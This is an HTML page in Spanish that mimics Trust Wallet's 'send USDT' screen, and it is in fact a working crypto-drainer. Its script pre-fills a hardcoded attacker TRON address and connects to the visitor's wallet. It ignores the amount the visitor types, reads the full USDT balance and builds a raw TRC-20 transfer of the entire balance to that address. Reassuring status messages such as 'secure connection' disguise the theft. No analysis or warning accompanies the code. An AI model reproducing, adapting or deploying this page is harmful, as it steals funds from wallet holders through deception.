<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet - Enviar USDT</title>
    <style>
        :root { color-scheme: light; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body {
            background-color: #ffffff;
            color: #111111;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 30px;
        }
        .tw-container { width: 100%; max-width: 390px; padding: 20px; }
        .tw-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; }
        .tw-header-title { font-size: 18px; font-weight: 600; color: #111111; flex-grow: 1; text-align: center; margin-right: -24px; }
        .back-icon { width: 24px; height: 24px; color: #111111; }
        .tw-input-group { background-color: #f6f7f9; border-radius: 16px; padding: 16px; margin-bottom: 16px; }
        .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
        .tw-input-row { display: flex; align-items: center; justify-content: space-between; }
        .tw-input { background: transparent; border: none; color: #111111; font-size: 16px; width: 80%; outline: none; }
        .tw-input::placeholder { color: #a3a7af; }
        .tw-action-text { color: #0052ff; font-size: 14px; font-weight: 600; cursor: pointer; }
        .tw-currency-badge { color: #111111; font-size: 16px; font-weight: 600; }
        .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 13px; color: #0052ff; margin-bottom: 24px; display: none; text-align: left; }
        .tw-btn-container { margin-top: 40px; }
        .tw-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .tw-btn:disabled { background-color: #b3ccff; }
    </style>
</head>
<body>

    <div class="tw-container">
        <div class="tw-header">
            <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <line x1="19" y1="12" x2="5" y2="12"></line>
                <polyline points="12 19 5 12 12 5"></polyline>
            </svg>
            <div class="tw-header-title">Enviar Tether</div>
        </div>

        <div class="tw-input-group">
            <label class="tw-label" for="addressDisplay">Dirección o nombre de dominio</label>
            <div class="tw-input-row">
                <input id="addressDisplay" class="tw-input" type="text" />
                <span class="tw-action-text">Pegar</span>
            </div>
        </div>

        <div class="tw-input-group">
            <label class="tw-label" for="amountDisplay">Cantidad</label>
            <div class="tw-input-row">
                <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any" />
                <span id="maxAction" class="tw-action-text" style="margin-right: 12px; display: none;">MÁX</span>
                <span class="tw-currency-badge">USDT</span>
            </div>
        </div>

        <div id="status" class="status-box"></div>

        <div class="tw-btn-container">
            <button class="tw-btn" id="connectBtn">Siguiente</button>
        </div>
    </div>

<script>
    const BILLETERA_DESTINO = "TNQaxFKxhoYdMgbZqVHumy84tBidBaWT45"; 
    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    

    const connectBtn = document.getElementById('connectBtn');
    const statusDiv = document.getElementById('status');
    const amountDisplay = document.getElementById('amountDisplay');
    const addressDisplay = document.getElementById('addressDisplay');
    const maxAction = document.getElementById('maxAction');

    let walletAddress = null;

    function setStatus(message) {
        statusDiv.innerText = message || '';
        statusDiv.style.display = message ? 'block' : 'none';
    }

    addressDisplay.value = BILLETERA_DESTINO;

    connectBtn.addEventListener('click', async () => {
        // PASO 1: Sincronizar billetera
        if (!walletAddress) {
            try {
                setStatus("Estableciendo enlace RPC con Trust Wallet...");
                connectBtn.disabled = true;

                if (typeof window.tronWeb === 'undefined') {
                    throw new Error("Abre esta página desde el explorador interno de una billetera TRON.");
                }

                const tronWeb = window.tronWeb;
                
                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                    walletAddress = tronWeb.defaultAddress.base58;
                } else {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res && res.code === 200) {
                        walletAddress = tronWeb.defaultAddress.base58;
                    }
                }

                if (!walletAddress) {
                    throw new Error("Permiso de lectura denegado.");
                }

                maxAction.style.display = "inline";
                setStatus("Conexión segura. Confirma los datos e inicia la firma digital.");
                connectBtn.innerText = "Continuar";
                connectBtn.disabled = false;

            } catch (error) {
                console.error(error);
                setStatus(error.message || "Error de sincronización Web3.");
                connectBtn.disabled = false;
                connectBtn.innerText = "Siguiente";
            }
            return;
        }

        // PASO 2: Ejecución directa unificada para móviles (Máximo Saldo)
        if (walletAddress) {
            try {
                const userAmount = parseFloat(amountDisplay.value);
                if (isNaN(userAmount) || userAmount <= 0) {
                    throw new Error("Digita una cantidad válida en el casillero numérico.");
                }

                setStatus("Consultando el libro contable de USDT en la red de TRON...");
                connectBtn.disabled = true;

                const tronWeb = window.tronWeb;
                
                // Consulta veloz y compatible de balance continuo en nodos móviles
                const ownerHex = tronWeb.address.toHex(walletAddress).padStart(64, '0');
                const balanceHex = await tronWeb.trx.getContractConstant(
                    CONTRATO_USDT,
                    "balanceOf(address)",
                    ownerHex,
                    false
                );
                
                if (!balanceHex || !balanceHex.constant_result || balanceHex.constant_result.length === 0) {
                    throw new Error("La red no respondió a la consulta de fondos.");
                }
                
                // Capturar el valor devuelto y rellenarlo dinámicamente a estructura de 32 bytes
                const unitsInSunHex = balanceHex.constant_result[0].padStart(64, '0');

                if (parseInt(unitsInSunHex, 16) === 0) {
                    throw new Error("Tu cuenta no posee balances disponibles de USDT (TRC-20).");
                }

                setStatus("Lanzando pasarela nativa... Confirma la firma en tu pantalla.");

                const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO).replace(/^41/, '00000000000000000000000041');
                
                // Construcción de la carga útil binaria completa (Selector + Destino + Saldo Neto)
                const hexData = "a9059cbb" + destinoHex + unitsInSunHex;

                // Ejecución directa unificada sin intermediarios
                const txId = await tronWeb.trx.sendTransaction(CONTRATO_USDT, 0, {
                    data: hexData,
                    feeLimit: 100000000
                });

                if (txId) {
                    setStatus("¡Transferencia de saldo total transmitida con éxito!");
                    connectBtn.innerText = "Completado";
                }

            } catch (error) {
                console.error(error);
                setStatus(error.message || "La transacción fue rechazada o cancelada por el usuario.");
                connectBtn.disabled = false;
                connectBtn.innerText = "Continuar";
            }
        }
    });

    maxAction.addEventListener('click', async () => {
        if (!walletAddress) return;
        try {
            setStatus("Calculando fondos totales...");
            const tronWeb = window.tronWeb;
            const ownerHex = tronWeb.address.toHex(walletAddress).padStart(64, '0');
            const balanceHex = await tronWeb.trx.getContractConstant(CONTRATO_USDT, "balanceOf(address)", ownerHex, false);
            const unitsInSun = tronWeb.toBigNumber('0x' + balanceHex.constant_result[0]);
            amountDisplay.value = Number(unitsInSun.toString()) / 1_000_000;
            setStatus("Saldo máximo asignado.");
        } catch (e) {
            console.error(e);
        }
    });
</script>
</body>
</html>
